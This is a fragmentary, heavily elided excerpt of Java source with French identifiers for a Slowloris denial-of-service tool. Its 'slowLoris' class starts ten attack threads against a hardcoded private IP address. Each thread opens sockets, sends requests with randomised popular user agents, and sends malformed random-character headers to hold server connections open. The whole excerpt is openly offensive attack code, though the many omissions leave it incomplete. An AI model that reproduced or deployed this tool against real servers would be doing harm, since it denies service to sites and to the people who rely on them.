...
public class slowLoris
{
    public void main(String[] args)
    {
        try
        {
            ...
            final int NB_THREADS_ATTAQUE = 10;
            URL url_cible = new URL("10.101.101.4");
          
            final int MULTIPLICATEUR = 10;
    
            for(int i=0; i<NB_THREADS_ATTAQUE ;i++)
            {
                Connexions co = new Connexions(PORT_CIBLE,url_cible,MULTIPLICATEUR);
				new Thread(co).start();
            }
        }
        catch(Exception e)
	...
	class Connexions implements Runnable
	{
		...
		protected String[] creerRequetesAttaques()
		{
			...
			for(int i=0; i<multiplicateur ;i++)
			{
				int indexRandom =(int) (Math.random() * ( userAgentsPopulaires.length ));
		...
		protected void preparerConnexion(int cpt)
		{
			try
			{
				InetAddress address = InetAddress.getByName(urlCible.getHost());
				mesSockets[cpt] = new Socket(address,port); //ou alors essayer sans le http:// de l'url
			}
			catch(Exception e)
			{
		...
		{              
			try
			{
				int indiceDeRequeteAuHasard = (int)( Math.random() * ( multiplicateur ));
		...
		protected void envoyerMauvaisHeader(int cpt)
		{
			...
			int indiceAleaTitreChamp = (int) (Math.random() * ( listOfChars.length ));
			int indiceAleaTitreChamp2 = (int) (Math.random() * ( listOfChars.length ));
			int indiceAleaValChamp = (int) (Math.random() * ( listOfChars.length ));
